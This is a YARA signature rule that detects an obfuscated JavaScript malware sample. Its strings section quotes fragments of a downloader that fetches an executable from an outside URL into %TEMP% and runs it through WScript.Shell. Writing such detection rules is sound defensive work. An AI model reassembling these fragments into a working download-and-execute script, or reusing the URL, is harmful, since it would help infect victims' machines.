rule sig_20160328_03c31f6f296bca39cedbd908c51cbdda {
  meta:
    description = "datamaliciousorder - file 20160328_03c31f6f296bca39cedbd908c51cbdda.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "5edf1f6132ffcce1f8f031eddcf7369271547c163ef05d5dac3aa1450e8fcafb"

  strings:
    $s1  = "function Gebxotyh() {return Omyskftkd[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"BXF5u99I19lCDVw.exe\";};" fullword ascii
    $s2  = "Mcskovy[Ysbhmbony](\"GET\", \"http://themesbin.com/k9sjaf\", false);" fullword ascii
    $s3  = "do {WScript[Nxmxt](Jpqzgdee() * 11)} while (Mcskovy[\"readystate\"] < 4 );" fullword ascii
    $s4  = "function Htkwutd(Fgdwedlgkq, Qqlcw){return Fgdwedlgkq - Qqlcw;};" fullword ascii
    $s5  = "var Omyskftkd = function Cpzbd() {return WScript[Jeqvaxyy](\"WScript.Shell\");}();" fullword ascii
    $s6  = "function Bjdweks(Wdmwffmyws){Omyskftkd[\"Run\"](Wdmwffmyws, Bsffruclgp, Bsffruclgp);};" fullword ascii
    $s7  = "var Runfxlowd = false;" fullword ascii
    $s8  = "function Qvodmptbvb() {return ((Fydjp == true) && (Fydjp == Ecuoopm)) ? 1 : Bsffruclgp;};" fullword ascii
    $s9  = "var Ghzkleri = new this[\"Date\"]();" fullword ascii
    $s10 = "function Scqzoxjuw(Wuznuhoaex) {var Olxehr = (1, 2, 3, 4, 5, Wuznuhoaex); return Olxehr;};" fullword ascii
    $s11 = "Fydjp = true; " fullword ascii
    $s12 = "Ecuoopm = true; " fullword ascii
    $s13 = " while (Wuncxi){" fullword ascii
    $s14 = "var Ecuoopm = false;" fullword ascii
    $s15 = "function Gkqvkmvfek(){return Jsimexlo;};" fullword ascii
    $s16 = "var Fydjp = false;" fullword ascii
    $s17 = "function Rhiuc()" fullword ascii
    $s18 = "return Htkwutd(Lwjcwpf, Gmkao);" fullword ascii
    $s19 = "function Jpqzgdee(){return 22;};" fullword ascii
    $s20 = "function Kpgmlwvwdz(){return Jeqvaxyy;};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}